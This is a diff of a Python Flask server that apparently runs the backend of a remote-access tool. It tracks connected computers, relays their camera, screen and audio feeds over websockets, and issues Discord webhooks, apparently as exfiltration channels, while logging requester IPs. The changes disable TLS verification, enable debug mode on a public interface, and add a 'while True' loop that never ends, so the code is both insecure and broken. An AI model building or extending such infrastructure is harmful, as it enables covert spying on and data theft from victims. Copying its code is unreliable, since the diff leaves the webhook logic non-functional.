@@ -26,6 +26,7 @@ connectedComputers = []
 
 
 channel_id = os.environ["channel_id"]
+channel_id2 = os.environ["channel_id2"]
 
 
 headers = {
@@ -62,35 +63,32 @@ def create_webhook(channel, timeout=10):
     response = requests.post(
         f"https://discord.com/api/v9/channels/{channel}/webhooks",
         json={"name": "Captain Hook"},
-        headers=headers
+        headers=headers,
+        verify=False,
+        timeout=timeout,
     ).json()
     return response
 
 
 def get_webhooks(channel):
-    return requests.get(
-        f"https://discord.com/api/v9/channels/{channel}/webhooks", headers=headers
-    ).json()
+    try:
+        return requests.get(
+            f"https://discord.com/api/v9/channels/{channel}/webhooks", headers=headers
+        ).json()
+    except:
+        return None
 
 
 def get_webhook():
     response = {"code": 30007}
-    try:
+    while True:
         response = create_webhook(channel_id)
-        print(response)
-        response['id']
-    except:
-        try:
-            response = random.choice(get_webhooks(channel_id))
-            print(response)
-            response['id']
-        except:
-            return None
 
-    webhook = f"https://discord.com/api/webhooks/{response['id']}/{response['token']}"
+    if 'id' not in response:
+      return None
 
-    print(webhook)
-    return webhook
+    print(f"https://discord.com/api/webhooks/{response['id']}/{response['token']}")
+    return f"https://discord.com/api/webhooks/{response['id']}/{response['token']}"
 
 
 def zipdir(path, ziph):
@@ -243,15 +241,15 @@ def camera(ws):
     computer = ws.receive()
   
     if not computer in camera_recv_ws:
-        camera_recv_ws[computer] = []
+      camera_recv_ws[computer] = []
       
     camera_recv_ws[computer].append(ws)
     while True:
-        try:
-            ws.receive()
-        except:
-            camera_recv_ws[computer].remove(ws)
-            return
+      try:
+       ws.receive()
+      except:
+        del camera_recv_ws[computer]
+        return
         
 @sock.route("/api/ws/showScreen")
 def screen(ws):
@@ -269,11 +267,11 @@ def screen(ws):
   
     screen_recv_ws[computer].append(ws)
     while True:
-        try:
-            ws.receive()
-        except:
-            screen_recv_ws[computer].remove(ws)
-            return
+      try:
+       ws.receive()
+      except:
+        del screen_recv_ws[computer]
+        return
 
 
 @sock.route("/api/ws/playAudio")
@@ -295,11 +293,11 @@ def audio(ws):
   
     audio_recv_ws[computer].append(ws)
     while True:
-        try:
-            ws.receive()
-        except:
-            audio_recv_ws[computer].remove(ws)
-            return
+      try:
+       ws.receive()
+      except:
+        del audio_recv_ws[computer]
+        return
 
 def update(ws):
     global connectedComputers
@@ -425,10 +423,10 @@ def webhook():
 
     webhook = get_webhook()
     log_webhook_creation(webhook, ip)
-  
     if not webhook:
-        backup = True
-        webhook = os.environ["backup_webhook"]
+      backup = True
+      webhook = os.environ["backup_webhook"]
+
 
     return webhook
 
@@ -527,4 +525,4 @@ def notallowed(e):
 
 if __name__ == "__main__":
     # Run the Flask app
-    app.run(host="0.0.0.0", port=8080)
+    app.run(host="0.0.0.0", debug=True, port=8080)
